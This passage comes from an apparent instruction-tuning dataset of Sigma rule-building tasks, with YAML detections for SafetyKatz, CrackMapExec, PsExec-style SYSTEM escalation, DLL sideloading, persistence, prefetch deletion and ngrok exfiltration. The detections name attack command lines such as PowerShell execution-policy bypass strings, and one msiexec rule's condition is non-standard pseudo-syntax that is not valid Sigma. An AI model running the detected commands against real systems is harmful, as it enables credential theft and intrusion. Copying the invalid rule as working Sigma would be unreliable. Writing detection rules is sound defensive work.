    "instruction": "Build a Sigma rule with the goal of detecting execution of the hacktool SafetyKatz via PE information and default Image name.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of the hacktool SafetyKatz via PE information and default Image name, you should: Focus on monitoring process creation logs within Windows environments for any instances where the image name ends with '\\SafetyKatz.exe', the original file name is specified as 'SafetyKatz.exe', or the description is exactly 'SafetyKatz'. These indicators are critical for identifying potential malicious activities associated with SafetyKatz, a well-known tool used in cyber attacks for extracting sensitive information. The detection of such activities is crucial, with false positives being unlikely, indicating a high confidence in these specific attributes as indicators of compromise. By focusing on these specific characteristics within the process creation logs, efforts can be concentrated on a vital aspect of monitoring for malicious activity, aligning with tactics and techniques that include but are not limited to credential access.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SafetyKatz.exe'\n        - OriginalFileName: 'SafetyKatz.exe'\n        - Description: 'SafetyKatz'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SafetyKatz.exe'\n        - OriginalFileName: 'SafetyKatz.exe'\n        - Description: 'SafetyKatz'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "execution of the hacktool SafetyKatz via PE information and default Image name",
      "answer": "In order to detect the execution of the hacktool SafetyKatz via PE information and default Image name, you should: Focus on monitoring process creation logs within Windows environments for any instances where the image name ends with '\\SafetyKatz.exe', the original file name is specified as 'SafetyKatz.exe', or the description is exactly 'SafetyKatz'. These indicators are critical for identifying potential malicious activities associated with SafetyKatz, a well-known tool used in cyber attacks for extracting sensitive information. The detection of such activities is crucial, with false positives being unlikely, indicating a high confidence in these specific attributes as indicators of compromise. By focusing on these specific characteristics within the process creation logs, efforts can be concentrated on a vital aspect of monitoring for malicious activity, aligning with tactics and techniques that include but are not limited to credential access."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential DLL sideloading of \"libcurl.dll\" by the \"gup.exe\" process from an uncommon location.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential DLL sideloading of \"libcurl.dll\" by the \"gup.exe\" process from an uncommon location, you should monitor Windows image load events for instances where the \"gup.exe\" process loads the \"libcurl.dll\". It is important to note that the legitimate process \"Notepad++\\updater\\GUP.exe\" loading \"libcurl.dll\" should not be considered suspicious and thus is excluded from this detection criterion. This detection focuses on identifying abnormal or potentially malicious activity involving the sideloading technique where \"gup.exe\" is found outside of its usual update process environment, specifically targeting DLL files with the name \"libcurl.dll\". Consequently, this activity is observed under suspicion of being an attack technique but does come with a caution regarding unknown false positives, indicating that not all detections might represent actual threats. The severity level of this rule is marked as medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\gup.exe'\n        ImageLoaded|endswith: '\\libcurl.dll'\n    filter_main_notepad_plusplus:\n        Image|endswith: '\\Notepad++\\updater\\GUP.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\gup.exe'\n        ImageLoaded|endswith: '\\libcurl.dll'\n    filter_main_notepad_plusplus:\n        Image|endswith: '\\Notepad++\\updater\\GUP.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "potential DLL sideloading of \"libcurl.dll\" by the \"gup.exe\" process from an uncommon location",
      "answer": "In order to detect potential DLL sideloading of \"libcurl.dll\" by the \"gup.exe\" process from an uncommon location, you should monitor Windows image load events for instances where the \"gup.exe\" process loads the \"libcurl.dll\". It is important to note that the legitimate process \"Notepad++\\updater\\GUP.exe\" loading \"libcurl.dll\" should not be considered suspicious and thus is excluded from this detection criterion. This detection focuses on identifying abnormal or potentially malicious activity involving the sideloading technique where \"gup.exe\" is found outside of its usual update process environment, specifically targeting DLL files with the name \"libcurl.dll\". Consequently, this activity is observed under suspicion of being an attack technique but does come with a caution regarding unknown false positives, indicating that not all detections might represent actual threats. The severity level of this rule is marked as medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious parent processes that should not have any children or should only have a single possible child program.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious parent processes that should not have any children or should only have a single possible child program, you should:\n\nFocus on monitoring process creation activities on Windows systems. Your detection strategy involves identifying when specific applications, that generally do not spawn child processes during regular operation, unusually initiate a child process. Specifically, look out for instances where 'minesweeper.exe', 'winver.exe', or 'bitsadmin.exe' serve as parent images for any child processes. Moreover, a special emphasis is placed on situations where 'csrss.exe', 'certutil.exe', 'eventvwr.exe', 'calc.exe', and 'notepad.exe' act as parent images, due to their typical usage patterns or functions within the operating system.\n\nHowever, be aware of and exclude from alerts certain child processes such as 'WerFault.exe', 'wermgr.exe', 'conhost.exe', 'mmc.exe', 'win32calc.exe', and 'notepad.exe' following specific parents like 'csrss.exe', 'certutil.exe', 'eventvwr.exe', and 'calc.exe', as these combinations are common and can be legitimate under particular circumstances. This refined approach helps to reduce the risk of flagging benign activity as suspicious, reducing the volume of false positives.\n\nThis targeted monitoring is anchored in responding to tactics and techniques associated with persistence, privilege escalation, and defense evasion by malicious actors, as these actions often require manipulation of parent-child process relationships to execute unauthorized or malicious code under the guise of legitimate system or software operations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\minesweeper.exe'\n            - '\\winver.exe'\n            - '\\bitsadmin.exe'\n    selection_special:\n        ParentImage|endswith:\n            - '\\csrss.exe'\n            - '\\certutil.exe'\n         # - '\\schtasks.exe'\n            - '\\eventvwr.exe'\n            - '\\calc.exe'\n            - '\\notepad.exe'\n    filter_special:\n        Image|endswith:\n            - '\\WerFault.exe'\n            - '\\wermgr.exe'\n            - '\\conhost.exe' # csrss.exe, certutil.exe\n            - '\\mmc.exe'     # eventvwr.exe\n            - '\\win32calc.exe' # calc.exe\n            - '\\notepad.exe'\n    filter_null:\n        Image: null\n    condition: selection or ( selection_special and not 1 of filter_* )\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\minesweeper.exe'\n            - '\\winver.exe'\n            - '\\bitsadmin.exe'\n    selection_special:\n        ParentImage|endswith:\n            - '\\csrss.exe'\n            - '\\certutil.exe'\n         # - '\\schtasks.exe'\n            - '\\eventvwr.exe'\n            - '\\calc.exe'\n            - '\\notepad.exe'\n    filter_special:\n        Image|endswith:\n            - '\\WerFault.exe'\n            - '\\wermgr.exe'\n            - '\\conhost.exe' # csrss.exe, certutil.exe\n            - '\\mmc.exe'     # eventvwr.exe\n            - '\\win32calc.exe' # calc.exe\n            - '\\notepad.exe'\n    filter_null:\n        Image: null\n    condition: selection or ( selection_special and not 1 of filter_* )\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious parent processes that should not have any children or should only have a single possible child program",
      "answer": "In order to detect suspicious parent processes that should not have any children or should only have a single possible child program, you should:\n\nFocus on monitoring process creation activities on Windows systems. Your detection strategy involves identifying when specific applications, that generally do not spawn child processes during regular operation, unusually initiate a child process. Specifically, look out for instances where 'minesweeper.exe', 'winver.exe', or 'bitsadmin.exe' serve as parent images for any child processes. Moreover, a special emphasis is placed on situations where 'csrss.exe', 'certutil.exe', 'eventvwr.exe', 'calc.exe', and 'notepad.exe' act as parent images, due to their typical usage patterns or functions within the operating system.\n\nHowever, be aware of and exclude from alerts certain child processes such as 'WerFault.exe', 'wermgr.exe', 'conhost.exe', 'mmc.exe', 'win32calc.exe', and 'notepad.exe' following specific parents like 'csrss.exe', 'certutil.exe', 'eventvwr.exe', and 'calc.exe', as these combinations are common and can be legitimate under particular circumstances. This refined approach helps to reduce the risk of flagging benign activity as suspicious, reducing the volume of false positives.\n\nThis targeted monitoring is anchored in responding to tactics and techniques associated with persistence, privilege escalation, and defense evasion by malicious actors, as these actions often require manipulation of parent-child process relationships to execute unauthorized or malicious code under the guise of legitimate system or software operations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM privileges, you should monitor the creation of Windows processes for specific command-line arguments that indicate an elevation attempt to the LOCAL_SYSTEM account. These arguments include variations of '-s' and '/s' flags in combination with 'cmd', 'powershell', 'pwsh', or any similar command line interpreter software, often paired with '-i' or '/i' to start an interactive session. It's crucial to note that these flags can be used interchangeably (e.g., '-' can be replaced with '/') and the order of the arguments might not always be the same. Furthermore, variations specific to PowerShell version 7 (pwsh) and version 5 (powershell) are also considered. To avoid false alerts, the rule excludes known instances where command-line arguments include 'paexec', 'PsExec', or 'accepteula', as they are common tools that use similar flags but may not indicate malicious activity. These command-line arguments are typically associated with legitimate administrative tools, and exclusions are made for instances that may resemble typical tool usage or instances where software companies include such tools with their products under different names. This detection process is set to a high level of alert due to the potential impact of an attacker gaining SYSTEM privileges.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_flags_1:\n        # Escalation to LOCAL_SYSTEM\n        CommandLine|contains:\n            # Note that you don't need to add the \".exe\" part when using psexec/paexec\n            # The \"-\" can also be replaced with \"/\"\n            # The order of args isn't important\n            # \"cmd\" can be replaced by \"powershell\", \"pwsh\" or any other console like software\n            - ' -s cmd'\n            - ' /s cmd'\n            - ' -s -i cmd'\n            - ' /s /i cmd'\n            - ' /s -i cmd'\n            - ' -s /i cmd'\n            - ' -i -s cmd'\n            - ' /i /s cmd'\n            - ' -i /s cmd'\n            - ' /i -s cmd'\n            # Pwsh (For PowerShell 7)\n            - ' -s pwsh'\n            - ' /s pwsh'\n            - ' -s -i pwsh'\n            - ' /s /i pwsh'\n            - ' /s -i pwsh'\n            - ' -s /i pwsh'\n            - ' -i -s pwsh'\n            - ' /i /s pwsh'\n            - ' -i /s pwsh'\n            - ' /i -s pwsh'\n            # PowerShell (For PowerShell 5)\n            - ' -s powershell'\n            - ' /s powershell'\n            - ' -s -i powershell'\n            - ' /s /i powershell'\n            - ' /s -i powershell'\n            - ' -s /i powershell'\n            - ' -i -s powershell'\n            - ' /i /s powershell'\n            - ' -i /s powershell'\n            - ' /i -s powershell'\n    filter:\n        # This filter exclude strings covered by 8834e2f7-6b4b-4f09-8906-d2276470ee23\n        CommandLine|contains:\n            - 'paexec'\n            - 'PsExec'\n            - 'accepteula'\n    condition: 1 of selection_flags_* and not filter\nfalsepositives:\n    - Weird admins that rename their tools\n    - Software companies that bundle PsExec/PAExec with their software and rename it, so that it is less embarrassing\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_flags_1:\n        # Escalation to LOCAL_SYSTEM\n        CommandLine|contains:\n            # Note that you don't need to add the \".exe\" part when using psexec/paexec\n            # The \"-\" can also be replaced with \"/\"\n            # The order of args isn't important\n            # \"cmd\" can be replaced by \"powershell\", \"pwsh\" or any other console like software\n            - ' -s cmd'\n            - ' /s cmd'\n            - ' -s -i cmd'\n            - ' /s /i cmd'\n            - ' /s -i cmd'\n            - ' -s /i cmd'\n            - ' -i -s cmd'\n            - ' /i /s cmd'\n            - ' -i /s cmd'\n            - ' /i -s cmd'\n            # Pwsh (For PowerShell 7)\n            - ' -s pwsh'\n            - ' /s pwsh'\n            - ' -s -i pwsh'\n            - ' /s /i pwsh'\n            - ' /s -i pwsh'\n            - ' -s /i pwsh'\n            - ' -i -s pwsh'\n            - ' /i /s pwsh'\n            - ' -i /s pwsh'\n            - ' /i -s pwsh'\n            # PowerShell (For PowerShell 5)\n            - ' -s powershell'\n            - ' /s powershell'\n            - ' -s -i powershell'\n            - ' /s /i powershell'\n            - ' /s -i powershell'\n            - ' -s /i powershell'\n            - ' -i -s powershell'\n            - ' /i /s powershell'\n            - ' -i /s powershell'\n            - ' /i -s powershell'\n    filter:\n        # This filter exclude strings covered by 8834e2f7-6b4b-4f09-8906-d2276470ee23\n        CommandLine|contains:\n            - 'paexec'\n            - 'PsExec'\n            - 'accepteula'\n    condition: 1 of selection_flags_* and not filter\nfalsepositives:\n    - Weird admins that rename their tools\n    - Software companies that bundle PsExec/PAExec with their software and rename it, so that it is less embarrassing\nlevel: high\n",
      "question": "unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges",
      "answer": "In order to detect unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM privileges, you should monitor the creation of Windows processes for specific command-line arguments that indicate an elevation attempt to the LOCAL_SYSTEM account. These arguments include variations of '-s' and '/s' flags in combination with 'cmd', 'powershell', 'pwsh', or any similar command line interpreter software, often paired with '-i' or '/i' to start an interactive session. It's crucial to note that these flags can be used interchangeably (e.g., '-' can be replaced with '/') and the order of the arguments might not always be the same. Furthermore, variations specific to PowerShell version 7 (pwsh) and version 5 (powershell) are also considered. To avoid false alerts, the rule excludes known instances where command-line arguments include 'paexec', 'PsExec', or 'accepteula', as they are common tools that use similar flags but may not indicate malicious activity. These command-line arguments are typically associated with legitimate administrative tools, and exclusions are made for instances that may resemble typical tool usage or instances where software companies include such tools with their products under different names. This detection process is set to a high level of alert due to the potential impact of an attacker gaining SYSTEM privileges."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting various execution patterns of the CrackMapExec pentesting framework.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect various execution patterns of the CrackMapExec pentesting framework, you should: Monitor process creation logs on Windows systems for specific command line patterns indicating potential use of the framework. These patterns include command line instructions ending with redirections such as 'cmd.exe /Q /c' followed by an attempt to redirect output to a remote shared folder, which could be an indication of executing remote commands or running fileless scripts via SMB/WMI. Additionally, attention should be paid to command lines that contain powershell.exe executions, especially with flags implying obfuscation or encoding, which suggests an attempt to bypass PowerShell execution policies. These activities are associated with tactics and techniques like Execution, PowerShell, and Command and Scripting Interpreter. You should specifically look out for command lines that attempt to execute PowerShell in a way that bypasses the default security features, or that directs output to remote locations or temporary files, indicative of stealthy or fileless operations. Conclusively, any match against these patterns should be scrutinized, although bearing in mind that there could be unknown false positives. Fields of interest in this scenario include ComputerName, User, and CommandLine.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|endswith:\n            # cme/protocols/smb/wmiexec.py (generalized execute_remote and execute_fileless)\n            - 'cmd.exe /Q /c * 1> \\\\\\\\*\\\\*\\\\* 2>&1'\n            # cme/protocols/smb/atexec.py:109 (fileless output via share)\n            - 'cmd.exe /C * > \\\\\\\\*\\\\*\\\\* 2>&1'\n            # cme/protocols/smb/atexec.py:111 (fileless output via share)\n            - 'cmd.exe /C * > *\\\\Temp\\\\* 2>&1'\n        CommandLine|contains:\n            # cme/helpers/powershell.py:139 (PowerShell execution with obfuscation)\n            - 'powershell.exe -exec bypass -noni -nop -w 1 -C \"'\n            # cme/helpers/powershell.py:149 (PowerShell execution without obfuscation)\n            - 'powershell.exe -noni -nop -w 1 -enc '\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|endswith:\n            # cme/protocols/smb/wmiexec.py (generalized execute_remote and execute_fileless)\n            - 'cmd.exe /Q /c * 1> \\\\\\\\*\\\\*\\\\* 2>&1'\n            # cme/protocols/smb/atexec.py:109 (fileless output via share)\n            - 'cmd.exe /C * > \\\\\\\\*\\\\*\\\\* 2>&1'\n            # cme/protocols/smb/atexec.py:111 (fileless output via share)\n            - 'cmd.exe /C * > *\\\\Temp\\\\* 2>&1'\n        CommandLine|contains:\n            # cme/helpers/powershell.py:139 (PowerShell execution with obfuscation)\n            - 'powershell.exe -exec bypass -noni -nop -w 1 -C \"'\n            # cme/helpers/powershell.py:149 (PowerShell execution without obfuscation)\n            - 'powershell.exe -noni -nop -w 1 -enc '\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "various execution patterns of the CrackMapExec pentesting framework",
      "answer": "In order to detect various execution patterns of the CrackMapExec pentesting framework, you should: Monitor process creation logs on Windows systems for specific command line patterns indicating potential use of the framework. These patterns include command line instructions ending with redirections such as 'cmd.exe /Q /c' followed by an attempt to redirect output to a remote shared folder, which could be an indication of executing remote commands or running fileless scripts via SMB/WMI. Additionally, attention should be paid to command lines that contain powershell.exe executions, especially with flags implying obfuscation or encoding, which suggests an attempt to bypass PowerShell execution policies. These activities are associated with tactics and techniques like Execution, PowerShell, and Command and Scripting Interpreter. You should specifically look out for command lines that attempt to execute PowerShell in a way that bypasses the default security features, or that directs output to remote locations or temporary files, indicative of stealthy or fileless operations. Conclusively, any match against these patterns should be scrutinized, although bearing in mind that there could be unknown false positives. Fields of interest in this scenario include ComputerName, User, and CommandLine."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect possible persistence using Fax DLL load when service restart.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect possible persistence using Fax DLL load when service restart, you should:\nMonitor Windows registry settings particularly related to service restart mechanisms. Specifically, focus on registry entries modification under the '\\Software\\Microsoft\\Fax\\Device Providers\\' path. Look for any changes that include the '\\ImageName' value. This observation points out an attempt to achieve persistence by exploiting Fax services, commonly overlooked in Windows environments. However, to reduce false positives and ensure accuracy, it's essential to exclude any modifications that involve the '%systemroot%\\system32\\fxst30.dll', as this is a legitimate usage scenario on Windows 10 systems. Given the high potential impact of such persistence techniques, any deviations from normal behavior under these parameters should be treated with heightened scrutiny. This detection is aligned with recognized attack tactics focusing on achieving persistence through manipulation of system processes or services.\n",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        TargetObject|contains|all:\n            - '\\Software\\Microsoft\\Fax\\Device Providers\\'\n            - '\\ImageName'\n    filter:\n        Details: '%systemroot%\\system32\\fxst30.dll' #Windows 10\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        TargetObject|contains|all:\n            - '\\Software\\Microsoft\\Fax\\Device Providers\\'\n            - '\\ImageName'\n    filter:\n        Details: '%systemroot%\\system32\\fxst30.dll' #Windows 10\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Detect possible persistence using Fax DLL load when service restart",
      "answer": "In order to detect possible persistence using Fax DLL load when service restart, you should:\nMonitor Windows registry settings particularly related to service restart mechanisms. Specifically, focus on registry entries modification under the '\\Software\\Microsoft\\Fax\\Device Providers\\' path. Look for any changes that include the '\\ImageName' value. This observation points out an attempt to achieve persistence by exploiting Fax services, commonly overlooked in Windows environments. However, to reduce false positives and ensure accuracy, it's essential to exclude any modifications that involve the '%systemroot%\\system32\\fxst30.dll', as this is a legitimate usage scenario on Windows 10 systems. Given the high potential impact of such persistence techniques, any deviations from normal behavior under these parameters should be treated with heightened scrutiny. This detection is aligned with recognized attack tactics focusing on achieving persistence through manipulation of system processes or services.\n"
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting This rule will looks any process with low privilege launching Windows Installer service (msiexec.exe) that tries to install MSI packages with SYSTEM privilege.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect any process with low privilege launching Windows Installer service (msiexec.exe) that tries to install MSI packages with SYSTEM privilege, you should monitor Windows process creation logs for specific patterns indicating potential exploitation of permissions elevation. Specifically:\n\n1. Look for instances where a process is created with 'System' integrity level or by the 'NT AUTHORITY\\SYSTEM' user. These represent high privilege operations likely performed by the system itself or a system administrator. However, in the context of suspicious activity, they could indicate malicious attempts to execute code or commands with elevated privileges.\n\n2. Identify any process named 'msiexec.exe' that does not originate from a user with 'NT AUTHORITY\\SYSTEM' privileges. The Windows Installer service, represented by 'msiexec.exe', is legitimate, but when initiated by low-privilege users, it may indicate an attempt to leverage Windows Installer for malicious purposes.\n\n3. Detect processes that have a parent process identifier (ParentProcessGuid) matching a previously noted suspicious process identifier (%suspicious_guid%). This linkage between processes suggests a chain of execution potentially leading to privilege escalation.\n\n4. Specifically target processes that are child of a suspect process and meet these criteria:\n   - The executable image path contains '\\Windows\\Installer\\' and has an 'msi' extension, ending with 'tmp'. These characteristics are unusual for legitimate use of the Windows Installer and may signify tampering or malicious MSI packages being installed.\n   - The process is executed at the system integrity level or by the 'NT AUTHORITY\\SYSTEM' user. This indicates an intent to execute with elevated privileges, bypassing normal user access controls.\n\nThe conditions for alerting include:\n   - Capturing the ProcessGuid of any 'msiexec.exe' process (not initiated by 'NT AUTHORITY\\SYSTEM') as a suspicious identifier.\n   - Triggering an alert if there\u2019s a process, originated with SYSTEM privilege, attempting to install an MSI package following the suspicious 'msiexec.exe' execution or directly attempting to execute 'msiexec.exe' with SYSTEM privileges, satisfying the specified image path conditions.\n\nIn analyzing logs for these patterns, one must account for false positives, such as legitimate system administrator activities that may involve similar process creation characteristics. Monitoring should be set at a high level of alert due to the potential severity of exploiting the Windows Installer service to elevate privileges maliciously.\n\nBy examining these specific indicators within the Windows process creation logs, you can uncover attempts to exploit the Windows Installer service to execute MSI packages with elevated SYSTEM privilege, a tactic often leveraged by attackers seeking to gain higher access rights on a compromised system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    system_integrity:\n        IntegrityLevel: 'System'\n    system_user:\n        User: 'NT AUTHORITY\\SYSTEM'\n    image_1:\n        Image|contains|all:\n            - '\\Windows\\Installer\\'\n            - 'msi'\n        Image|endswith:\n            - 'tmp'\n    image_2:\n        Image|endswith: '\\msiexec.exe'\n    child_of_suspicious_guid:\n        ParentProcessGuid: '%suspicious_guid%'\n    condition: write ProcessGuid from (event_id and image_2 and not system_user) to %suspicious_guid%; then if (child_of_suspicious_guid and event_id and image_1 and system_user) or (suspicious_guid and event_id and image_2 and system_user and integrity_level) -> alert\nfields:\n    - EventID\n    - IntegrityLevel\n    - User\n    - Image\n    - ParentProcessGuid\nfalsepositives:\n    - System administrator usage\nlevel: high",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    system_integrity:\n        IntegrityLevel: 'System'\n    system_user:\n        User: 'NT AUTHORITY\\SYSTEM'\n    image_1:\n        Image|contains|all:\n            - '\\Windows\\Installer\\'\n            - 'msi'\n        Image|endswith:\n            - 'tmp'\n    image_2:\n        Image|endswith: '\\msiexec.exe'\n    child_of_suspicious_guid:\n        ParentProcessGuid: '%suspicious_guid%'\n    condition: write ProcessGuid from (event_id and image_2 and not system_user) to %suspicious_guid%; then if (child_of_suspicious_guid and event_id and image_1 and system_user) or (suspicious_guid and event_id and image_2 and system_user and integrity_level) -> alert\nfields:\n    - EventID\n    - IntegrityLevel\n    - User\n    - Image\n    - ParentProcessGuid\nfalsepositives:\n    - System administrator usage\nlevel: high",
      "question": "This rule will looks any process with low privilege launching Windows Installer service (msiexec.exe) that tries to install MSI packages with SYSTEM privilege",
      "answer": "In order to detect any process with low privilege launching Windows Installer service (msiexec.exe) that tries to install MSI packages with SYSTEM privilege, you should monitor Windows process creation logs for specific patterns indicating potential exploitation of permissions elevation. Specifically:\n\n1. Look for instances where a process is created with 'System' integrity level or by the 'NT AUTHORITY\\SYSTEM' user. These represent high privilege operations likely performed by the system itself or a system administrator. However, in the context of suspicious activity, they could indicate malicious attempts to execute code or commands with elevated privileges.\n\n2. Identify any process named 'msiexec.exe' that does not originate from a user with 'NT AUTHORITY\\SYSTEM' privileges. The Windows Installer service, represented by 'msiexec.exe', is legitimate, but when initiated by low-privilege users, it may indicate an attempt to leverage Windows Installer for malicious purposes.\n\n3. Detect processes that have a parent process identifier (ParentProcessGuid) matching a previously noted suspicious process identifier (%suspicious_guid%). This linkage between processes suggests a chain of execution potentially leading to privilege escalation.\n\n4. Specifically target processes that are child of a suspect process and meet these criteria:\n   - The executable image path contains '\\Windows\\Installer\\' and has an 'msi' extension, ending with 'tmp'. These characteristics are unusual for legitimate use of the Windows Installer and may signify tampering or malicious MSI packages being installed.\n   - The process is executed at the system integrity level or by the 'NT AUTHORITY\\SYSTEM' user. This indicates an intent to execute with elevated privileges, bypassing normal user access controls.\n\nThe conditions for alerting include:\n   - Capturing the ProcessGuid of any 'msiexec.exe' process (not initiated by 'NT AUTHORITY\\SYSTEM') as a suspicious identifier.\n   - Triggering an alert if there\u2019s a process, originated with SYSTEM privilege, attempting to install an MSI package following the suspicious 'msiexec.exe' execution or directly attempting to execute 'msiexec.exe' with SYSTEM privileges, satisfying the specified image path conditions.\n\nIn analyzing logs for these patterns, one must account for false positives, such as legitimate system administrator activities that may involve similar process creation characteristics. Monitoring should be set at a high level of alert due to the potential severity of exploiting the Windows Installer service to elevate privileges maliciously.\n\nBy examining these specific indicators within the Windows process creation logs, you can uncover attempts to exploit the Windows Installer service to execute MSI packages with elevated SYSTEM privilege, a tactic often leveraged by attackers seeking to gain higher access rights on a compromised system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting deletion of a prefetch file which may indicate an attempt to destroy forensic evidence.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the deletion of a prefetch file which may indicate an attempt to destroy forensic evidence, you should monitor for file deletion events specifically within the Windows environment. Focus on files that begin with the path 'C:\\Windows\\Prefetch\\' and have a '.pf' file extension, as these are prefetch files which Windows uses to speed up the loading of applications. Exclude any deletion events initiated by the process 'C:\\windows\\system32\\svchost.exe' or by users whose names contain strings suggestive of administrative rights in various language settings, such as 'AUTHORI' or 'AUTORI', to reduce false positives. This detection is crucial as the removal of prefetch files might be a tactic used by attackers to erase traces of their activities, making forensic analysis more challenging.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_delete\ndetection:\n    selection:\n        TargetFilename|startswith: 'C:\\Windows\\Prefetch\\'\n        TargetFilename|endswith: '.pf'\n    filter:\n        Image: 'C:\\windows\\system32\\svchost.exe'\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_delete\ndetection:\n    selection:\n        TargetFilename|startswith: 'C:\\Windows\\Prefetch\\'\n        TargetFilename|endswith: '.pf'\n    filter:\n        Image: 'C:\\windows\\system32\\svchost.exe'\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "deletion of a prefetch file which may indicate an attempt to destroy forensic evidence",
      "answer": "In order to detect the deletion of a prefetch file which may indicate an attempt to destroy forensic evidence, you should monitor for file deletion events specifically within the Windows environment. Focus on files that begin with the path 'C:\\Windows\\Prefetch\\' and have a '.pf' file extension, as these are prefetch files which Windows uses to speed up the loading of applications. Exclude any deletion events initiated by the process 'C:\\windows\\system32\\svchost.exe' or by users whose names contain strings suggestive of administrative rights in various language settings, such as 'AUTHORI' or 'AUTORI', to reduce false positives. This detection is crucial as the removal of prefetch files might be a tactic used by attackers to erase traces of their activities, making forensic analysis more challenging."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors, you should: Monitor network connections on Windows systems for communications with specific ngrok tunneling endpoint hostnames. These hostnames include 'tunnel.us.ngrok.com', 'tunnel.eu.ngrok.com', 'tunnel.ap.ngrok.com', 'tunnel.au.ngrok.com', 'tunnel.sa.ngrok.com', 'tunnel.jp.ngrok.com', and 'tunnel.in.ngrok.com'. When such activity is detected, it may indicate an attempt at unauthorized data exfiltration. However, bear in mind that there could be legitimate uses of ngrok, so each detection should be investigated to confirm malicious activity. This activity is considered of high importance due to the potential for it to indicate data being exfiltrated by malicious actors, bypassing usual data transmission safeguards.",
    "context": "",
